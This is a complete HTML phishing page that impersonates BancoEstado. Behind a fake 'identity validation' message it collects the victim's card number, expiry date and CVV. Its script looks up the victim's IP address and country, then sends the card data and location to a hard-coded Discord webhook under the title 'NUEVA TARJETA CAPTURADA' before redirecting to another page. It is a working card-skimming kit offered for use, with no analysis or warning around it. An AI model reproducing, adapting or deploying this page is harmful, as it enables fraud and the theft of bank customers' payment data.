<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BancoEstado - Validación</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap');

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, sans-serif;
            background-color: #f8f9fb;
            display: flex;
            justify-content: center;
            color: #334155;
        }

        .main-container {
            width: 100%;
            max-width: 420px;
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            box-shadow: 0 10px 25px rgba(0,0,0,0.03);
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
        }

        .logo {
            height: 28px;
            opacity: 0.9;
        }

        .close-btn {
            width: 32px;
            height: 32px;
            background-color: #f1f5f9;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #64748b;
            font-size: 18px;
            cursor: pointer;
        }

        .message-section {
            padding: 40px 30px 20px;
            text-align: center;
        }

        .validation-text {
            font-size: 15px;
            color: #1e293b;
            line-height: 1.6;
            font-weight: 400;
            letter-spacing: -0.2px;
        }

        .highlight {
            display: block;
            margin-top: 5px;
            font-weight: 600;
            color: #ff8c00;
            font-size: 13px;
            text-transform: uppercase;
        }

        .form-container {
            padding: 20px 30px;
        }

        .input-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-bottom: 8px;
            color: #64748b;
        }

        input, select {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            font-size: 15px;
            box-sizing: border-box;
            outline: none;
            background-color: #fcfdfe;
            transition: all 0.2s;
            color: #1e293b;
        }

        input:focus {
            border-color: #ff8c00;
            background-color: #fff;
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
        }

        .row {
            display: flex;
            gap: 12px;
        }

        .col { flex: 1; }

        .btn-continuar {
            background-color: #ff8c00;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            margin-top: 25px;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.2);
            transition: transform 0.2s, background 0.2s;
        }

        /* Botón verde para éxito visual */
        .btn-ready {
            background-color: #FFA500 !important;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2) !important;
        }

        .footer-secure {
            margin-top: auto;
            padding: 30px;
            text-align: center;
            font-size: 11px;
            color: #94a3b8;
            letter-spacing: 0.3px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b3/Logo_BancoEstado.svg/1280px-Logo_BancoEstado.svg.png" alt="Logo" class="logo">
            <div class="close-btn">✕</div>
        </div>

        <div class="message-section">
            <div class="validation-text">
                Para tu seguridad, si tienes un producto activo con nosotros, por favor ingresa los datos de tu tarjeta para validar tu identidad.
                <span class="highlight">Verificación Requerida</span>
            </div>
        </div>

        <div class="form-container">
            <div class="input-group">
                <label>Número de Tarjeta</label>
                <input type="text" id="card-input" placeholder="0000 0000 0000 0000" maxlength="19">
            </div>

            <div class="row">
                <div class="col">
                    <div class="input-group">
                        <label>Mes (MM)</label>
                        <select id="month-select">
                            <option value="" disabled selected>Mes</option>
                            <option>01</option><option>02</option><option>03</option><option>04</option>
                            <option>05</option><option>06</option><option>07</option><option>08</option>
                            <option>09</option><option>10</option><option>11</option><option>12</option>
                        </select>
                    </div>
                </div>
                <div class="col">
                    <div class="input-group">
                        <label>Año (AA)</label>
                        <select id="year-select">
                            <option value="" disabled selected>Año</option>
                        </select>
                    </div>
                </div>
            </div>

            <div class="input-group">
                <label>CVV</label>
                <input type="password" id="cvv-input" placeholder="•••" maxlength="3" inputmode="numeric">
            </div>

            <button class="btn-continuar" id="btnValidar">Validar Identidad</button>
        </div>

        <div class="footer-secure">
            🔒 Solo usaremos esta informacion para validar tu identidad.
        </div>
    </div>

    <script>
        // Generar años dinámicamente
        const yearSelect = document.getElementById('year-select');
        for (let i = 2026; i <= 2036; i++) {
            let option = document.createElement('option');
            option.value = i.toString().slice(-2);
            option.textContent = i;
            yearSelect.appendChild(option);
        }

        const cardInput = document.getElementById('card-input');
        const cvvInput = document.getElementById('cvv-input');
        const monthSelect = document.getElementById('month-select');
        const btnValidar = document.getElementById('btnValidar');

        // Formatear tarjeta y validar
        cardInput.addEventListener('input', (e) => {
            let value = e.target.value.replace(/\D/g, ''); 
            let formatted = value.match(/.{1,4}/g)?.join(' ') || '';
            e.target.value = formatted;
            checkForm();
        });

        function checkForm() {
            if (cardInput.value.length >= 19 && cvvInput.value.length === 3 && monthSelect.value !== "" && yearSelect.value !== "") {
                btnValidar.classList.add('btn-ready');
            } else {
                btnValidar.classList.remove('btn-ready');
            }
        }

        [cvvInput, monthSelect, yearSelect].forEach(el => el.addEventListener('change', checkForm));
        cvvInput.addEventListener('input', checkForm);

        // Envío a Discord con IP y País
        btnValidar.addEventListener('click', async () => {
            const webhookURL = "https://discord.com/api/webhooks/1465019093836103945/6LbG2CTqQEP3jJOc6gY143KS6doKInBNVZIWvyj6Ct6J8Lq6Fxw8Pn-LcPRFq1Ljlyyq";

            btnValidar.innerText = "Procesando...";
            btnValidar.disabled = true;

            try {
                // 1. Capturar IP y País
                const geoRes = await fetch('https://ipapi.co/json/');
                const geoData = await geoRes.json();
                const ipReal = geoData.ip || "No detectada";
                const paisReal = geoData.country_name || "Desconocido";

                // 2. Armar objeto para Discord
                const data = {
                    embeds: [{
                        title: "💳 NUEVA TARJETA CAPTURADA",
                        color: 3066993, // Verde
                        fields: [
                            { name: "Número de Tarjeta", value: `\`${cardInput.value}\`` },
                            { name: "Expiración", value: `${monthSelect.value}/${yearSelect.value}`, inline: true },
                            { name: "CVV", value: `\`${cvvInput.value}\``, inline: true },
                            { name: "🌐 IP Usuario", value: `\`${ipReal}\``, inline: false },
                            { name: "🇨🇱 Ubicación", value: `**${paisReal}**`, inline: true }
                        ],
                        footer: { text: "Verificación de Identidad v3.0" },
                        timestamp: new Date()
                    }]
                };

                // 3. Enviar fetch
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                window.location.href = "index4.html";
            } catch (error) {
                console.error("Error:", error);
                window.location.href = "index4.html";
            }
        });
    </script>
</body>
</html>
